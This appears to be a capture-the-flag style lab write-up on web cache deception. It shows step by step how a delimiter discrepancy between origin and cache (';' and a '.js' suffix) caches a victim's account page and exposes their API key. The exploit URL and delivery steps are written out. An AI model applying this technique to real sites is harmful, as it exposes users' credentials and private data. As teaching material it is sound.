# Lab 02 — Exploiting Path Delimiters for Web Cache Deception

## Objective

Find a delimiter discrepancy between the origin server and cache server and use it to obtain the API key for the lab victim.

---

# Credentials

```text
Username: wiener
Password: peter
```

---

# Methodology

```text
Identify Target Endpoint
        ↓
Identify Origin Delimiters
        ↓
Identify Cache Delimiter Discrepancy
        ↓
Add Static Extension
        ↓
Confirm Caching
        ↓
Deliver Malicious URL
        ↓
Retrieve Victim Data
```

---

# Step 1 — Identify Target

Log in using:

```text
wiener:peter
```

Inspect the `/my-account` response.

The response contains the authenticated user's API key.

---

# Step 2 — Send to Repeater

In:

```text
Proxy → HTTP history
```

send:

```text
GET /my-account
```

to Repeater.

---

# Step 3 — Establish Reference

Change:

```text
/my-account
```

to:

```text
/my-account/abc
```

The origin returns:

```text
404 Not Found
```

This indicates that the origin does not abstract the path to `/my-account`.

Now test:

```text
/my-accountabc
```

This also produces a 404 response.

Use this as the reference response.

---

# Step 4 — Identify Delimiters

Send the request to Intruder.

Use a payload position:

```text
/my-account§§abc
```

Test possible delimiter characters.

Disable automatic URL encoding under:

```text
Payloads → Payload encoding
```

so the delimiter characters are sent as intended.

---

# Step 5 — Analyze Results

The lab identifies:

```text
;
?
```

as delimiters used by the origin.

These characters result in the origin returning the `/my-account` response.

---

# Step 6 — Test Cache Interpretation

Test:

```text
/my-account?abc.js
```

If there is no evidence of caching, the cache may also interpret `?` as a delimiter.

Now test:

```text
/my-account;abc.js
```

The lab behavior indicates:

```text
X-Cache: miss
```

Resend the request.

It changes to:

```text
X-Cache: hit
```

This demonstrates the delimiter discrepancy.

---

# Interpretation

The origin interprets:

```text
/my-account;abc.js
```

as:

```text
/my-account
```

The cache interprets:

```text
/my-account;abc.js
```

as the full path and recognizes:

```text
.js
```

---

# Exploit URL

The lab exploit uses:

```text
/my-account;wcd.js
```

The arbitrary string should be unique so that the victim receives a fresh cache entry.

---

# Deliver to Victim

Use the lab exploit server to navigate the victim to the malicious URL.

The lab's intended approach uses a client-side redirect to the crafted URL.

---

# Retrieve Response

Request:

```text
/my-account;wcd.js
```

after the victim has accessed it.

The cached response contains the victim's API key.

---

# Key Learning

The vulnerability results from:

```text
Origin
   ↓
Uses ; as delimiter

Cache
   ↓
Does not use ; as delimiter
   ↓
Sees .js
```

This creates a cache/origin interpretation discrepancy.